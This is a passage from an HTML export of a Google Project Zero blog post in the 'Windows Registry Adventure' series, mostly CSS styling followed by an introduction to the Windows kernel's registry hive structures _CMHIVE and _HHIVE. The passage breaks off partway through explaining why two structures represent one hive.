&quot;}ul.lst-kix_rsqcvs5pzvc3-4{list-style-type:none}ul.lst-kix_rsqcvs5pzvc3-3{list-style-type:none}ul.lst-kix_rsqcvs5pzvc3-2{list-style-type:none}.lst-kix_t96lsgedizsa-2&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-2}ul.lst-kix_w4u8mtfc6uha-2{list-style-type:none}ul.lst-kix_w4u8mtfc6uha-1{list-style-type:none}.lst-kix_1zxa3b55tidx-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_w4u8mtfc6uha-4{list-style-type:none}ul.lst-kix_w4u8mtfc6uha-3{list-style-type:none}.lst-kix_q60yv0wr6jjb-3&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-3}ul.lst-kix_w4u8mtfc6uha-0{list-style-type:none}.lst-kix_c9xp0vh8wziq-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ac166bpppqid-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bkiq3d71krcq-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_x7s489v8w7yg-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ysdrt8wuz901-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_c9xp0vh8wziq-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_h7x1tub5dbe4-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_alnxlx3ivjyl-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ujr7qqe1p9gc-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_h3wwlbtif53z-3{list-style-type:none}ul.lst-kix_h3wwlbtif53z-4{list-style-type:none}ul.lst-kix_h3wwlbtif53z-1{list-style-type:none}ul.lst-kix_h3wwlbtif53z-2{list-style-type:none}ul.lst-kix_d2sey3cqswhj-1{list-style-type:none}ul.lst-kix_d2sey3cqswhj-2{list-style-type:none}ul.lst-kix_h3wwlbtif53z-0{list-style-type:none}ul.lst-kix_d2sey3cqswhj-0{list-style-type:none}ul.lst-kix_er11mo8sb81m-5{list-style-type:none}ul.lst-kix_er11mo8sb81m-6{list-style-type:none}ul.lst-kix_er11mo8sb81m-7{list-style-type:none}ul.lst-kix_er11mo8sb81m-8{list-style-type:none}.lst-kix_t96lsgedizsa-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-1,decimal) &quot;. &quot;}.lst-kix_xrub3d64di6y-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xrub3d64di6y-3,decimal) &quot;. &quot;}.lst-kix_bkiq3d71krcq-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_8nqiqtogbohm-0{list-style-type:none}ul.lst-kix_d2sey3cqswhj-5{list-style-type:none}ul.lst-kix_8nqiqtogbohm-1{list-style-type:none}ul.lst-kix_d2sey3cqswhj-6{list-style-type:none}ul.lst-kix_d2sey3cqswhj-3{list-style-type:none}ul.lst-kix_d2sey3cqswhj-4{list-style-type:none}ul.lst-kix_8nqiqtogbohm-4{list-style-type:none}ul.lst-kix_h3wwlbtif53z-7{list-style-type:none}.lst-kix_xrub3d64di6y-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xrub3d64di6y-6,decimal) &quot;. &quot;}ul.lst-kix_8nqiqtogbohm-5{list-style-type:none}ul.lst-kix_h3wwlbtif53z-8{list-style-type:none}ul.lst-kix_8nqiqtogbohm-2{list-style-type:none}ul.lst-kix_d2sey3cqswhj-7{list-style-type:none}ul.lst-kix_h3wwlbtif53z-5{list-style-type:none}ul.lst-kix_8nqiqtogbohm-3{list-style-type:none}ul.lst-kix_d2sey3cqswhj-8{list-style-type:none}ul.lst-kix_h3wwlbtif53z-6{list-style-type:none}.lst-kix_qxy8bxc9ldy0-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fr1tg9t3fnuc-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-3,decimal) &quot;. &quot;}.lst-kix_q60yv0wr6jjb-6&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-6}.lst-kix_q2cw7ye43y3y-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rkrpvoovd3qp-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4ibbyvy1vtvo-6&gt;li{counter-increment:lst-ctn-kix_4ibbyvy1vtvo-6}.lst-kix_yglvxt1mgfm7-6&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-6}.lst-kix_etb3tue10oz0-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_yglvxt1mgfm7-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yglvxt1mgfm7-8,lower-roman) &quot;. &quot;}.lst-kix_mfb7gblnyelm-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_b5jwtymjp8wg-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_kf4qbiideq6a-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fr1tg9t3fnuc-5&gt;li{counter-increment:lst-ctn-kix_fr1tg9t3fnuc-5}.lst-kix_o7h24lqlh2ds-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_iwbl6bi5grxz-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_887mzeed6aeb-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_yglvxt1mgfm7-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yglvxt1mgfm7-0,decimal) &quot;. &quot;}.lst-kix_psxevvsc6jj-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_wgc4so2hx3bb-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_q60yv0wr6jjb-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_q60yv0wr6jjb-3,decimal) &quot;. &quot;}.lst-kix_ujr7qqe1p9gc-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_h3wwlbtif53z-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3jqgp1gp6n0e-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_w4u8mtfc6uha-6{list-style-type:none}ul.lst-kix_w4u8mtfc6uha-5{list-style-type:none}.lst-kix_d8jkcmfkq4n7-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_w4u8mtfc6uha-8{list-style-type:none}.lst-kix_d2sey3cqswhj-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_w4u8mtfc6uha-7{list-style-type:none}.lst-kix_u8gl45uj8k5w-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xis8r8r67pmi-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_1zxa3b55tidx-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vk3kycj1zc1-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_q60yv0wr6jjb-8{list-style-type:none}.lst-kix_vwtmwxmruch-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_q60yv0wr6jjb-5{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-0{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-4{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-1{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-7{list-style-type:none}.lst-kix_u8gl45uj8k5w-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_q60yv0wr6jjb-6{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-1{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-4{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-5{list-style-type:none}.lst-kix_9qmrelv5gsqt-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_q60yv0wr6jjb-3{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-2{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-2{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-3{list-style-type:none}ul.lst-kix_b5jwtymjp8wg-4{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-8{list-style-type:none}ul.lst-kix_b5jwtymjp8wg-3{list-style-type:none}ul.lst-kix_b5jwtymjp8wg-6{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-6{list-style-type:none}ul.lst-kix_b5jwtymjp8wg-5{list-style-type:none}ul.lst-kix_d2x9ez3q88fg-7{list-style-type:none}ul.lst-kix_b5jwtymjp8wg-0{list-style-type:none}.lst-kix_4ibbyvy1vtvo-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_4ibbyvy1vtvo-7,lower-latin) &quot;. &quot;}ul.lst-kix_b5jwtymjp8wg-2{list-style-type:none}ul.lst-kix_b5jwtymjp8wg-1{list-style-type:none}ul.lst-kix_gsr5a4k8h49r-0{list-style-type:none}.lst-kix_xynuzpm7g9iu-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_gsr5a4k8h49r-3{list-style-type:none}.lst-kix_h3wwlbtif53z-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d2x9ez3q88fg-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_gsr5a4k8h49r-4{list-style-type:none}.lst-kix_6jkbamo228jj-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_gsr5a4k8h49r-1{list-style-type:none}ul.lst-kix_gsr5a4k8h49r-2{list-style-type:none}ul.lst-kix_gsr5a4k8h49r-7{list-style-type:none}ul.lst-kix_gsr5a4k8h49r-8{list-style-type:none}ul.lst-kix_gsr5a4k8h49r-5{list-style-type:none}ul.lst-kix_gsr5a4k8h49r-6{list-style-type:none}.lst-kix_vk3kycj1zc1-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_y0pkx69mb2m-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bn7fk5scblva-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xq15m7rnzuwj-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s0pfb3xl5agk-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rsqcvs5pzvc3-3&gt;li:before{content:&quot;\0025cf   &quot;}ol{margin:0;padding:0}table td,table th{padding:0}.tTszyzmaCA-c37{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:242.2pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:435.8pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c42{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:48pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c47{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:242.2pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c34{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:436.5pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c20{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:45.8pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c49{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:415.5pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c41{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:184.5pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c33{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:275.2pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c53{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:437.2pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c51{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:130.5pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c26{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:165.8pt;border-top-color:#000000;border-bottom-style:solid}.tTszyzmaCA-c10{margin-left:36pt;padding-top:12pt;padding-left:0pt;padding-bottom:12pt;line-height:1.5;orphans:2;widows:2;text-align:left}.tTszyzmaCA-c12{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.tTszyzmaCA-c8{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.tTszyzmaCA-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.tTszyzmaCA-c40{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.tTszyzmaCA-c21{padding-top:14pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.tTszyzmaCA-c17{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left;height:11pt}.tTszyzmaCA-c31{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.tTszyzmaCA-c56{padding-top:12pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.tTszyzmaCA-c1{font-size:9pt;font-family:&quot;Roboto Mono&quot;;color:#188038;font-weight:400}.tTszyzmaCA-c48{padding-top:12pt;padding-bottom:12pt;line-height:1.5;text-align:left}.tTszyzmaCA-c6{color:#000000;font-weight:400;font-size:11pt;font-family:&quot;Arial&quot;;line-height:1.5}.tTszyzmaCA-c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.tTszyzmaCA-c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.tTszyzmaCA-c36{color:#666666;font-weight:400;font-size:11pt;font-family:&quot;Arial&quot;}.tTszyzmaCA-c43{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:center}.tTszyzmaCA-c35{color:#666666;font-weight:400;font-size:12pt;font-family:&quot;Arial&quot;}.tTszyzmaCA-c57{padding-top:0pt;padding-bottom:12pt;line-height:1.5;text-align:left}.tTszyzmaCA-c16{color:#434343;font-weight:400;font-size:14pt;font-family:&quot;Arial&quot;}.tTszyzmaCA-c38{border-spacing:0;border-collapse:collapse;margin-right:auto}.tTszyzmaCA-c22{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.tTszyzmaCA-c25{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.tTszyzmaCA-c18{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.tTszyzmaCA-c39{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.tTszyzmaCA-c45{color:#188038;font-weight:400;font-family:&quot;Roboto Mono&quot;}.tTszyzmaCA-c62{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.tTszyzmaCA-c58{font-weight:400;font-size:16pt;font-family:&quot;Arial&quot;}.tTszyzmaCA-c2{font-size:9pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.tTszyzmaCA-c4{text-decoration:none;vertical-align:baseline;font-style:normal}.tTszyzmaCA-c24{font-size:10.5pt;font-family:&quot;Arial&quot;}.tTszyzmaCA-c55{font-weight:400;font-family:Consolas,&quot;Courier New&quot;}.tTszyzmaCA-c46{font-size:11pt;font-family:&quot;Arial&quot;}.tTszyzmaCA-c54{text-decoration:none;vertical-align:baseline}.tTszyzmaCA-c15{margin-left:36pt;padding-left:0pt}.tTszyzmaCA-c60{margin-left:36pt;text-indent:-18pt}.tTszyzmaCA-c13{orphans:2;widows:2}.tTszyzmaCA-c14{margin-left:72pt;padding-left:0pt}.tTszyzmaCA-c5{font-weight:700}.tTszyzmaCA-c19{color:#c5221f}.tTszyzmaCA-c28{color:#1967d2}.tTszyzmaCA-c27{vertical-align:super}.tTszyzmaCA-c23{font-size:9pt}.tTszyzmaCA-c61{font-size:11pt}.tTszyzmaCA-c52{background-color:#d9d9d9}.tTszyzmaCA-c44{font-style:italic}.tTszyzmaCA-c50{color:#b80672}.tTszyzmaCA-c7{color:#000000}.tTszyzmaCA-c29{height:11pt}.tTszyzmaCA-c59{color:#999999}.tTszyzmaCA-c11{color:#37474f}.tTszyzmaCA-c32{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;;line-height:1.5;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left;margin-block-start:0;margin-block-end:0}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c62 doc-content&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c59&quot;&gt;Posted by Mateusz Jurczyk, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Welcome back to the Windows Registry Adventure! In the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;previous installment&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the series&lt;/span&gt;&lt;span&gt;, we took a deep look into the internals of the regf hive format. Understanding this foundational aspect of the registry is crucial, as it illuminates the design principles behind the mechanism, as well as its inherent strengths and weaknesses. The data stored within the regf file represents the definitive state of the hive. Knowing how to parse this data is sufficient for handling static files encoded in this format, such as when writing a custom regf parser to inspect hives extracted from a hard drive. However, for those interested in how regf files are managed by Windows at runtime, rather than just their behavior in isolation, there&amp;#39;s a whole other dimension to explore: the multitude of kernel-mode objects allocated and maintained throughout the lifecycle of an active hive. These auxiliary objects are essential for several reasons:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_h7x1tub5dbe4-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To track all currently loaded hives, their properties (e.g., load flags), their memory mappings, and the relationships between them (especially for delta hives overlaid on top of each other).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To synchronize access to keys and hives within the multithreaded Windows environment.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To cache hive information for faster access compared to direct memory mapping lookups.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To integrate the registry with the NT Object Manager and support standard operations (opening/closing handles, setting/querying security descriptors, enforcing access checks, etc.).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To manage the state of pending transactions before they are fully committed to the underlying hive.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To address these diverse requirements, the Windows kernel employs numerous interconnected structures. In this post, we will examine some of the most critical ones, how they function, and how they can be effectively enumerated and inspected using WinDbg. It&amp;#39;s important to note that Microsoft provides official definitions only for some registry-related structures through PDB symbols for ntoskrnl.exe. In many cases, I had to reverse-engineer the relevant code to recover structure layouts, as well as infer the types and names of particular fields and enums. Throughout this write-up, I will clearly indicate whether each structure definition is official or reverse-engineered. If you spot any inaccuracies, please let me know. The definitions presented here are primarily derived from Windows Server 2019 with the March 2022 patches (kernel build 10.0.17763.2686), which was the kernel version used for the majority of my registry code analysis. However, over 99% of registry structure definitions appear to be identical between this version and the latest Windows 11, making the information directly applicable to the latest systems as well.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;tTszyzmaCA-c40 tTszyzmaCA-c13&quot; id=&quot;h.7rjwn7gy731m&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c58 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;Hive structures&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Given that hives are the most intricate type of registry object, it&amp;#39;s not surprising that their kernel-mode descriptors are equally complex and lengthy. The primary hive descriptor structure in Windows, known as _CMHIVE, spans a substantial 0x12F8 bytes &amp;ndash; exceeding 4 KiB, the standard memory page size on x86-family architectures. Contained within _CMHIVE, at offset 0, is another structure of type _HHIVE, which occupies 0x600 bytes, as depicted in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIE8uHd2DJ-gPQVj9KpjdpoVP-aLCdRXjAU0lIpKprgSI3KpFkoomVyU2PvhTA3zp_8ha28xuZUoXTTKKJjyevXRUf2NQ_NaJlHMoPx91KfE6UBsoyKl-VnRbA73_AjPxTf4ZXasUNMAwMKh3kc9VTWczg0ua_9ltU9G1BK7I4xEIHpJ9ubrxah9Jds5U/s1200/image1.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIE8uHd2DJ-gPQVj9KpjdpoVP-aLCdRXjAU0lIpKprgSI3KpFkoomVyU2PvhTA3zp_8ha28xuZUoXTTKKJjyevXRUf2NQ_NaJlHMoPx91KfE6UBsoyKl-VnRbA73_AjPxTf4ZXasUNMAwMKh3kc9VTWczg0ua_9ltU9G1BK7I4xEIHpJ9ubrxah9Jds5U/s1200/image1.png&quot; border=&quot;0&quot; alt=&quot;Diagram depicting the layout of the Windows Registry kernel structure _CMHIVE. It shows the overall _CMHIVE block, marked with a total size of 0x12F8 bytes. Within this block, the first part, from offset 0x0 to 0x600, is labeled as the _HHIVE structure. The remaining portion, from offset 0x600 to 0x12F8, is labeled &amp;quot;Rest of _CMHIVE&amp;quot;.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram depicting the layout of the Windows Registry kernel structure _CMHIVE. It shows the overall _CMHIVE block, marked with a total size of 0x12F8 bytes. Within this block, the first part, from offset 0x0 to 0x600, is labeled as the _HHIVE structure. The remaining portion, from offset 0x600 to 0x12F8, is labeled &amp;quot;Rest of _CMHIVE&amp;quot;.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;This relationship mirrors that of other common Windows object pairs, such as _EPROCESS / _KPROCESS and _ETHREAD / _KTHREAD. Because _HHIVE is always allocated as a component of the larger _CMHIVE structure, their pointer types are effectively interchangeable. If you encounter a decompiled access using a _HHIVE* &lt;/span&gt;&lt;span&gt;pointer&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;that extends beyond the size of the structure, it almost certainly indicates a reference to a field within the encompassing _CMHIVE object.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;But why are two distinct structures dedicated to representing a single registry hive? While technically not required, this separation likely serves to delineate fields associated with different abstraction layers of the hive. Specifically:&lt;/span&gt;&lt;/p&gt;
